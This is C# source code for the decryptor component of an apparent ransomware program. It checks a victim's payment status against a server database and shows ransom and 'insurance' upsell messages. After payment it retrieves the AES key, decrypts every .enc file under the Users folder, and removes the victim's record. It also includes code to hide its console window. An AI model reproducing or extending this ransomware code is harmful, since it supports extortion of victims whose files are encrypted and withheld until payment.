using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Globalization;
using System.Security.AccessControl;
using System.Windows.Forms;
using Encryptor;
using System.Runtime.InteropServices;
using System.Threading.Tasks;


namespace Decryptor
{
	internal class DecryptorClass
	{
		static string baseDirectory = "c:\\Users";
		
		// Hiding console prerequsites
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		static List<string> toDecrypt;
		
		
		public static void Main(string[] args)
		{              
			//hideConsole();
			
			TryToGetKey();
			
			
			var watch = System.Diagnostics.Stopwatch.StartNew();
			
			
			AesCryptoServiceProvider decryptAes = getDecryptionCipher();
			toDecrypt = new List<string>();
			decryptAllFiles(baseDirectory, decryptAes);
			decryptToDecryptList(decryptAes);
			
			watch.Stop();
			var elapsedMs = watch.ElapsedMilliseconds;
			Console.WriteLine("Elapsed Time: "+ elapsedMs + "and in Seconds: "+ (elapsedMs/1000));

			dislpayCompletionMessage();
			deleteVictimFromDB();
		}

			
		
		/// <summary>
		/// This method runs only if the decryption proccess comlpeted succesfully and then checks
		/// if the user bought insurance.
		///     If he did then it returns and dosen't delete his ID for feauture referance.
		///     If he didn't then it does delete hid ID.
		/// </summary>
		private static void deleteVictimFromDB()
		{
			if (DB.getStatus() == 1)
			{
				DB.deleteVictimsRow();
			}
		}
		
		
		
		/// <summary>
		/// Checks the status of the user and decides if to proceed and decrypt his files.
		/// </summary>
		private static void TryToGetKey()
		{
			int status = DB.getStatus();
			if (status == -1)
			{
				// notify user that he has to pay
				string message = "You havent paied the randsome yet. Hurry before it's too late... ;) \n" +
								 "If you have paied then just try again in a minute.";
				string caption = "Bad News...";
				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Error);
				Environment.Exit(0);
			}
			else if (status == 1)
			{
				string message = "Very Smart of you to pay. Your files will now be decrypted... \n" +
								 "Keep your computer running until a completion message will be displayed.";
				string caption = "Good News!";
				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Information);
				
			}
			else if (status == 2)
			{
				string message = "Very Smart of you to pay. Your files will now be decrypted... \n" +
								 "And also great choise to buy our insurance, we wiil never do this to you again <3 \n" +
								 "Keep your computer running until a completion message will be displayed.";
				string caption = "Great News!";
				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Information);
			}
			else
			{
				string message = "There has been an error with your status. It is: "+ (status);
				string caption = "Oops!";
				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Error);
			}
		}

		
		
		/// <summary>
		/// Displays a completion message to the user when the decryption proccess if complete. 
		/// </summary>
		private static void dislpayCompletionMessage()
		{
			string message = "OK all of your files have been decrypted and are now available to you again! \n ";
			string caption = "We're finished here";
			MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Information);
			
			Uri wallpaper = new Uri("http://s2.quickmeme.com/img/27/273fe8631cf4f18e104ba9d066caa11bac641cedbd5656d5f14a51796c3e352e.jpg");
			Wallpaper.Set(wallpaper,Wallpaper.Style.Fit);
		}

		
		
		/// <summary>
		/// Itterates over all of the files and decrypts all the files the have the extention .enc
		/// </summary>
		/// <param name="currentDirectory"></param>
		/// <param name="aes"></param>
		private static void decryptAllFiles(string currentDirectory, AesCryptoServiceProvider aes)
		{
			try
			{
				var currentFiles = Directory.GetFiles(currentDirectory, "*.enc");

				foreach (string filePath in currentFiles)
				{
					toDecrypt.Add(filePath);
					//decryptFile(filePath, aes);
					
				}

				var currentDirectories = Directory.GetDirectories(currentDirectory);
				foreach (string directory in currentDirectories)
				{
					decryptAllFiles(directory, aes);
				}
			}
			catch (UnauthorizedAccessException)
			{
				//System.Console.WriteLine("didn't access: " + currentDirectory);
			}
			

		}

		
		/// <summary>
		/// Decrypts a specific file 
		/// </summary>
		/// <param name="filePath"></param>
		/// <param name="aes"></param>
		public static void decryptFile(string filePath, AesCryptoServiceProvider aes)
		{
			//create new file name
			string origname = filePath.Remove(filePath.Length - 4);
			var buffer = new byte[65536];
			using (var streamIn = new FileStream(filePath, FileMode.Open, FileAccess.Read))
			using (var streamOut = new FileStream(origname, FileMode.Create))
			using (var decrypt = new CryptoStream(streamOut, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				int bytesRead;
				do
				{
					bytesRead = streamIn.Read(buffer, 0, buffer.Length);
					if (bytesRead != 0)
						decrypt.Write(buffer, 0, bytesRead);
				}
				while (bytesRead != 0);
			}
			//System.Console.WriteLine("Resolved: " + filePath);
			File.Delete(filePath);

		}

		
		private static void decryptToDecryptList(AesCryptoServiceProvider aes)
		{
			/*
			foreach (var filePath in toDecrypt)
			{
				try
				{
					decryptFile(filePath, aes);

				}
				catch
				{
				}
			}
			*/
			
			Parallel.ForEach(toDecrypt, filePath =>
				{
					try
					{
						decryptFile(filePath, aes);

					}
					catch
					{
					}
				}
			);
			
			
		}
		
		
		/// <summary>
		/// retrives the key from the server
		/// </summary>
		/// <returns></returns>
		public static AesCryptoServiceProvider getDecryptionCipher()
		{
			var aes = new AesCryptoServiceProvider();
			aes.Key =  DB.getKey().Split('-')
				.Select(x => byte.Parse(x, NumberStyles.HexNumber))
				.ToArray();
			aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
			return aes;

		}
		
		
				
		/// <summary>
		/// Hide the conlsoe inorder t oremain discreate
		/// </summary>
		private static void hideConsole()
		{
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
		} 
	}
}